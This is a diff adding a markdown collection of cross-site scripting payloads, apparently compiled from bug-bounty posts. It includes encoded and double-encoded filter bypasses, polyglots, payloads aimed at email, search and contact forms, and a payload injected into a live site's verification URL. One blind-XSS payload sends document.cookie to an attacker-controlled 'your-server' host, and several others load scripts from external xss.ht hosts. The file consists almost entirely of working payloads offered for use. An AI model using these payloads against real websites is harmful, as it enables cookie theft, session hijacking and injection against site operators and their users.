@@ -1,0 +1,75 @@
+# xss payloads
+Best Email xss :
+test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
+But you can try double encoding like :
+test@gmail.com%2527%5C%2522%253E%253Csvg%2Fonload%3Dalert%28%2Fxss%2F%29%253E
+
+XSS BYPASS PAYLOAD IN SEARCH FORM 🔥
+Payload:
+"><svg onload=prompt%26%23x000000028;document.domain)>
+
+got XSS in contact form.
+PAYLOAD:<img src="x:gif" onerror="window['al\u0065rt'](0)"></img>in gmail place -- ["');alert('XSS');//"]@xyz.xxx
+
+Simple payload :
+"><svg/onload=confirm(1)>"@x.y
+
+one can try it to get bounty in rxss😉
+https://xyz/xx/xx/?q=abc`;return false});});alert`xss`;</script>
+or using encoding
+https://xyz/xx/xx/?q=abc%60%3Breturn%20false%7D)%3B%7D)%3Balert%60xss%60%3B%3C%2Fscript%3E
+
+<a/href="j&#97v&#97script&#x3A;&#97lert(document.cookie)">ClickMe
+
+"></div><a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;document.cookie&rpar;">
+"></a><img/src=z onerror=alert(document.cookie);>
+
+those payload can testing all things like sql injection, SSTI, HTML injection, xss, and so on
+"`><img src=x>${{7*7}}
+
+xss on vafification email
+https://www.reddit.com/verification/asd',%20alert(document.location),%20%27
+
+Test for #xss and #SQLi
+--'`"><img src=x>kdskf${{7*7}}
+
+blind xss----------------
+you can test the website for Blind XSS using this payload:
+
+“><script>document.location= “http://your-server/?cookie=" + document.cookie</script>
+
+'"></title></textarea></script></style></noscript><script src=abc.xss.ht></script>
+
+----------Stores xss-------------------
+">]<img src=x onerror=alert(document.domain)>
+">]<img src=x onerror=alert(document.domain)> ">\]<img src=x onerror=alert(document.domain)>
+Stored XSS Payload
+
+<abdool attr=" --- x="=='='onmouseover=confirm`abdool` style="display:block;width:1000px;height:1000px;background:red"> --- ">
+
+
+xss
+%26%2302java%26%23115cript:alert(document.domain)
+<iframe%20srcdoc="<img%20src=1%20onerror=alert(document.cookie)>"></iframe>
+<form><input%20type=submit%20formaction=javascript:alert(1)%20value=XSS>
+“><svg onload=confirm(‘XSS’)>
+%2522%253E%253CsVg%252FOnLuFy%253D%2522X%253Dy%2522oNloaD%253D%253B1%255Econfirm%25281%2529%253E
+“><sVg/OnLuFy=”X=y”oNloaD=;1^confirm(1)>/``¹//
+<script>alert("1")</ScriPt>
+<script>alert("POC BY V33R")</Script>
+<scrIpT>alert(document.domain)</scriPT>
+/%22%3Cscript%3Ealert(String.fromCharCode(88,%20115,%20115,%2032,%2066,%20121,%2032,%2079,%20108,%20100,%2077,%20111,%20104,%2097,%20109,%20109))%3C/script%3E
+
+“javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain”
+%253cimg%20onerror=alert(1)%20src=a%253e
+%3cimg onerror=alert(1) src=a%3e
+<img onerror=alert(1) src=a>
+best <img src onerror=alt=''+document.domain>
+'"onclick=(co\u006efirm)?.`0`><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)`1`"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert`2`>%22%3E%3CSvg/onload=confirm`3`//<Script/src=//ChiragXSS.xSs.ht></scripT>
+2022 Best XSS polyglot ⚠️
+
+'"onclick=(co\u006efirm)?.0><sVg/i="${{7*7}}"oNload=" 0>(pro\u006dpt)1"></svG/</sTyle/</scripT/</textArea/</iFrame/</noScript/</seLect/--><h1><iMg/srC/onerror=alert2>%22%3E%3CSvg/onload=confirm3//<Script/src=//ChiragXSS.xSs.ht></scripT>
+"}<script>alert(document.cookie)</script>
+"}<script>prompt(document.domain)</script>
+"}<script>alert(document.location)</script>
+<svg><animate%20onend=alert(document.cookie)%20attributeName=x%20dur=1s>
